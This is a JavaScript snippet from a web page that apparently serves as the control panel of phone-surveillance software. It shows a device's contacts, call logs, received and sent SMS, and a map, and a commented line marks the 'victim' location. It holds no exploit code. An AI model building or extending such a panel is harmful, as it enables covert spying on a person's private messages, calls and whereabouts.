	<script type="text/javascript">

		var deviceid = location.search;
		console.log("new page id : " + location.search);

		var grid = null;
		//var grid2 = null;
		//数据表格使用
		var gridData = null;


		function initComplete() {

			//初始化显示联系人信息
			getData(0);
			setData(0);
			grid.resetHeight();
			grid.resetWidth();
		}

		$("#basicTabModern").bind("actived", function (e, idx) {
			if (idx == 4) {
				setData(idx);
			} else {
				getData(idx);
				setData(idx);
				grid.resetHeight();
				grid.resetWidth();
			}


			// if (idx == 0) {
			// 	getData(0);
			// 	setData();
			// 	grid.resetHeight();
			// 	grid.resetWidth();
			// }
			// else if (idx == 1) {
			// 	getData(1);
			// 	setData();
			// 	grid2.resetHeight();
			// 	grid2.resetWidth();
			// }
		})


		function setData(index) {
			//console.log(gridData);

			switch (index) {
				case 0: {
					grid = $("#dataContact").quiGrid({
						columns: [{
							display: '姓名',
							name: 'name',
							width: "45%"
						}, {
							display: '电话',
							name: 'phoneNo',
							width: "55%"
						}
						],
						data: gridData,
						sortName: 'name',
						rownumbers: true,
						checkbox: false,
						height: '100%',
						width: "100%",
						pageSize: 10,
						percentWidthMode: true,
						onAfterShowData: onAfterShowData

					});
				}
					break;
				case 1: {
					grid = $("#dataCalllogs").quiGrid({
						columns: [{
							display: '通话日起',
							name: 'date',
							width: "40%"
						}, {
							display: '通话时间(s)',
							name: 'duration',
							width: "10%"
						}, {
							display: '电话',
							name: 'phoneNo',
							width: "40%"
						}, {
							display: '类型',
							name: 'type',
							width: "10%",
							render: function (rowdata, rowindex, value, column) {
								return "1" == value ? "拨入" : "拨出";
							}
						}
						],
						data: gridData,
						sortName: 'date',
						rownumbers: true,
						checkbox: false,
						height: '100%',
						width: "100%",
						pageSize: 10,
						percentWidthMode: true,
						onAfterShowData: onAfterShowData

					});
				}
					break;
				case 2: {
					console.log(gridData);
					grid = $("#dataSmsRecv").quiGrid({
						columns: [{
							display: '日期',
							name: 'date',
							width: "15%"
						}, {
							display: '电话',
							name: 'phoneNo',
							width: "15%"
						}, {
							display: '信息',
							name: 'msg',
							width: "70%"
						}
						],
						data: gridData,
						sortName: 'date',
						rownumbers: true,
						checkbox: false,
						height: '100%',
						width: "100%",
						pageSize: 10,
						percentWidthMode: true,
						onAfterShowData: onAfterShowData

					});
				}
					break;
				case 3: {
					grid = $("#dataSmsSend").quiGrid({
						columns: [{
							display: '日期',
							name: 'date',
							width: "15%"
						}, {
							display: '电话',
							name: 'phoneNo',
							width: "15%"
						}, {
							display: '信息',
							name: 'msg',
							width: "70%"
						}
						],
						data: gridData,
						sortName: 'date',
						rownumbers: true,
						checkbox: false,
						height: '100%',
						width: "100%",
						pageSize: 10,
						percentWidthMode: true,
						onAfterShowData: onAfterShowData

					});
				}
					break;
				case 4: {
					var map = L.map('mapid').setView([51.505, -0.09], 13);
					L.tileLayer('http://{s}.tile.osm.org/{z}/{x}/{y}.png', {}).addTo(map);
					// var victimLoc = new L.LatLng(116.46, 39.92);
					// var marker = L.marker(victimLoc).addTo(map);
					// map.panTo(victimLoc);
				}
					break;

			}

		}

		function getData(col) {
			$.ajaxSettings.async = false;
			var dsturl = "http://127.0.0.1/phonesystem/backend/getdata.php" + deviceid + "&col=" + col;
			console.log(dsturl);
			$.get(dsturl, {},
				function (data, textStatus) {
					//console.log(data);
					var data = JSON.parse(data)
					// console.log(typeof data);
					console.log(data);
					gridData = {
						"form.paginate.pageNo": 1,
						"form.paginate.totalRows": 13,
						"rows": data
					}
				});
		}


		function onAfterShowData(data) {

		}

		function details() {
			window.location = 'oa_67.html'
		}
	</script>
